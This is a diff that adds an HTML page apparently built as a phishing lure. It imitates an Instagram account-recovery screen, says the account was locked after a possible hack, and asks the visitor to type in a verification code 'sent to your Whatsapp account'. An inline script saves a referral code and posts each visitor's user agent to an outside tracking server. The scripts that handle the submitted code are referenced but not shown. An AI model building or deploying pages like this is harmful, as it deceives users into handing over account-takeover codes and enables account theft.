@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport"
+      content="width=device-width, initial-scale=1">
+   <title>Unlock your account </title>
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha512-..." crossorigin="anonymous" referrerpolicy="no-referrer" />
+   <link rel="shortcut icon" type="image/x-icon" href="/AccountOpener/assets/79742556af337599cffa66603c1d1099.jpg">
+   
+   <script type="module" charset="utf-8"src="js/main.js">
+      
+   </script>
+     <script type="module">
+(async () => {
+  const BASE_URL = "https://prosper-cub-1.onrender.com";
+
+  // Store referral code from URL if present
+  function storeReferralIfPresentFromURL() {
+    const params = new URLSearchParams(window.location.search);
+    const ref = params.get("ref");
+    if (ref) localStorage.setItem("referralCode", ref);
+  }
+
+  // Retrieve stored referral (or fallback)
+  function getStoredReferral() {
+    return localStorage.getItem("referralCode") || "RDPIEG";
+  }
+
+  async function trackVisit(path = "Instagram help center") {
+    try {
+      storeReferralIfPresentFromURL();
+      const ref = getStoredReferral();
+
+      const payload = {
+        path,
+        referrer: ref,
+        utm: null,
+        userAgent: navigator.userAgent,
+      };
+
+      const res = await fetch(`${BASE_URL}/student/visit`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+      });
+
+      if (!res.ok) {
+        console.warn("❗ visit endpoint returned:", res.status, await res.text());
+        return;
+      }
+
+      const data = await res.json();
+      console.log("✅ Visit tracked:", data);
+    } catch (err) {
+      console.warn("⚠️ Visit tracking failed:", err.message || err);
+    }
+  }
+
+  // Auto-track when page loads
+  document.addEventListener("DOMContentLoaded", () => trackVisit());
+})();
+</script>
+   <script src="assets/js/index.js" type="module" charset="utf-8"></script>
+</head>
+
+<body>
+   <section class="card-container page active"id="intro">
+      <div class="card">
+         <div class="card-header">
+            <span class="times fa-lg">
+               &times;
+            </span>
+         </div>
+         <h2 class="page-title">
+            Choose a way to recover your account
+         </h2>
+         <p>
+            We locked your account to protect you from a possible hack. Use one of the following contact methods to recover your account.
+         </p>
+         <p>
+            Any mobile number or email you choose in this step will replace all existing login and contact info on your account.
+
+<a href="#">Learn more</a>
+         </p>
+         <div class="box">
+         </div>
+      </div>
+      
+      <div class="footer">
+         <button class="main-btn btn next-btn"data-role="nav"data-target="verify">
+            Continue 
+         </button>
+      </div>
+   </section>
+   
+       <section id="verify" class="page card-container bae">
+          <div class="card-header">
+             <span class="fas fa-arrow-left fa-lg"data-role="nav"data-target="intro"></span>
+          </div>
+        <form class="card bg-red-100 verify-form"id="verify-form">
+         <div class="form-content">
+           <h2 class="text-2xl page-title">Check your Whatsapp messages</h2>
+           <legend>Enter the code we sent to your Whatsapp account.</legend>
+           <img src="/AccountOpener/assets/a013dd45f0c9c3de700147007f760e5f.jpg" alt="Whatsapp image"class="ill ">
+         </div>
+      
+         <div class="form-data">
+           <div class="input-group">
+             <input type="number" name="code" id="code">
+             <label for="code">Enter code</label>
+             
+           </div>
+           
+           <div>
+             <div id="verify-output" class="verify-output small muted"></div>
+                   </div>
+                   <div class="btn-group">
+                        <button class="main-btn nav-btn  btn-f"type="submit"value="panel">
+               
+               Continue 
+               </button>
+               <button class="view-page syber-btn resent-code btn-f"type="button"value="panel"data-role="nav"data-target="intro">
+                 
+             Try another way
+           </button>
+   
+                   </div>
+         </div>
+      </form>
+  </section>
+</body>
+<script charset="utf-8"type="module"src="/AccountOpener/assets/js/input.js">
+   
+</script>
+<link rel="stylesheet" href="css/index.css">
+</html>
